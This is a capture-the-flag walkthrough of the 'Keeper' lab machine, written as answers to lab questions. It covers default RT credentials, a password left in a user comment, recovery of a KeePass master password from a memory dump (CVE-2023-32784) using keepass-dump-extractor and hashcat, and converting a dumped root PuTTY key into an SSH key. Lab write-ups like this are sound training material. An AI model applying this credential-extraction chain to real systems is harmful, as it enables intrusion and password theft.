## Keeper

### Lab Details 

- Difficulty: Easy
- Type: Web App, KeePass, Priv Esc

#### Tasks

Q1: How many open TCP ports are listening on Keeper?
 - `nmap 10.10.11.227 -sT -p- -T4 -vv -oA nmap_keeper`
 ```
 Not shown: 65497 closed tcp ports (conn-refused)
 PORT      STATE    SERVICE     REASON
 22/tcp    open     ssh         syn-ack
 80/tcp    open     http        syn-ack
 ```
Q2: What is the default password for the default user on Request Tracker (RT)?
 - Searching on google for default user login
 - username:root
 - password:password

Q3: Besides root, what other user is in RT?
 - visit Admin -> User on the top tool bar 
 - ref image attached 
![[RT.png]]

Q4: What is the lnorgaard user's password on Keeper?
 - user password is in the comment section of the user profile
 ![[user_comment.png]]

Q5: Submit the flag located in the lnorgaard user's home directory.
 - login to target using new found username and password
 - lnorgaard:Welcome2023!

Q6: Submit the flag located in the lnorgaard user's home directory.
 - cat user.txt

Q7: What is the 2023 CVE ID for a vulnerability in KeePass that allows an attacker access to the database's master password from a memory dump?
 - searching google regarding the 2023 keepass masterkey mem dump gives results on CVE-2023-32784
 - this github repo goes into details regarding the attack -> https://github.com/vdohney/keepass-password-dumper 

Q8: What is the master password for passcodes.kdbx?
 - we need 2 files to extract the master key according to https://github.com/JorianWoltjer/keepass-dump-extractor 
 - 1. memory dump of the KeePass process 
 - 2. the .kdbx file that we want to crack

 ```  
 keepass-dump-extractor KeePass.DMP -f all > wordlist.txt
 keepass2john passwords.kdbx > passwords.kdbx.hash
 hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt
 ```
 - we get `rødgrød med fløde` as the master key after running hashcat

Q9: What is the first line of the "Notes" section for the entry in the database containing a private SSH key?
 - tried to wget the passcode.kdbx and viewing it using keepass GUI however getting error 
 - install kpcli to interact with the database file via cli
 - command to view the entry is `show 0 -f` where 0 is the first entry and -f will show the password in plain.
```
kpcli:/passcodes/Network> show 0 -f

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
Q10: Submit the flag located in the root user's home directory.
 - the file in keeper.htb is a .ppk and in order to use it to login to ssh we will need to seperate the ssh private key from it
 - we need puttygen to perform this task 
 ```
 sudo apt install putty-tools
 puttygen keeper.ppk -O private-openssh -o id_rsa
 ``` 
 - where keeper.ppk is the file that contains the note section and id_rsa is the private key we can use to login to root via ssh 
 ``` ssh -i id_rsa target_ip 
 ```


#### Lesson Learned
 - Overcomplicating things, was expecting a RCE from an exploit in the web app to gain the initial foothold 
 - Try new found logins with different services on the target
